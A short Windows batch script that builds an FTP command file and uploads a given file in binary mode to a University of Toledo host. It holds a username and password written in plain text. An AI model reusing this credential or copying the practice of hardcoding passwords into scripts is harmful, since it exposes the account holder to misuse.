@echo off
echo user kglosse> ftpcmd.dat
echo kglosseCSET3100>> ftpcmd.dat
echo bin>> ftpcmd.dat
echo put %1>> ftpcmd.dat
echo quit>> ftpcmd.dat
ftp -n -s:ftpcmd.dat et791.ni.utoledo.edu
del ftpcmd.dat